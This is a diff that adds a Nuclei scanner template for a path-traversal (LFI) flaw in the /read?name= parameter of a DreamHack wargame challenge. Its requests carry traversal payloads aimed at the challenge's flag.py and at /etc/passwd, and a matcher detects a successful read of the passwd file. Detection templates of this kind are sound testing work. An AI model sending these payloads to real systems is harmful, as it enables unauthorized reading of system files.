@@ -1,0 +1,33 @@
+id: lfi-dreamhack-read-param
+
+info:
+  name: DreamHack LFI - read?name= Parameter
+  author: Marcos Tolosa
+  severity: high
+  description: |
+    Detecta vulnerabilidade de LFI (Local File Inclusion) através do parâmetro "name" na rota /read.
+    O servidor permite acesso arbitrário a arquivos locais, incluindo flag.py. (Desafio: https://dreamhack.io/wargame/challenges/37)
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+  tags: lfi,python,dreamhack,os-command,rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/read?name=../flag.py"
+      - "{{BaseURL}}/read?name=../../etc/passwd"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Nuclei Scanner)
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "FLAG"
+          - "DH{"
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
